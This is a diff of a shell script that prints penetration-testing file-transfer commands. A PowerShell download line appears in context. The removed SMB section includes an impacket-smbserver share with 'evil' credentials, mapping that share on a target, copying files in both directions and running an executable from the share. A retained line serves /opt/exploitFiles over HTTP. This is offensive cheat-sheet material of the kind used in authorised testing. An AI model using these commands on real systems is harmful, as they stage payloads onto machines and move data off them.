@@ -81,12 +81,7 @@ echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('htt
 echo -e ""
 
 
-echo -e "${Frame}###${End} ${Title}Transfer Through SMB Server${End} ${Frame}###${End}"
-echo -e "${Point} impacket-smbserver share . -username evil -password evil -smb2support"
-echo -e "    net use * \\\\\\$ip\share /u:evil evil"
-echo -e "    copy Z:\\\kali_to_target.exe"
-echo -e "    copy target_to_kali.txt Z:\\"
-echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
+
 
 if [ "$runServer" == "true" ]; then
 	sudo python3 -m http.server $port --directory /opt/exploitFiles
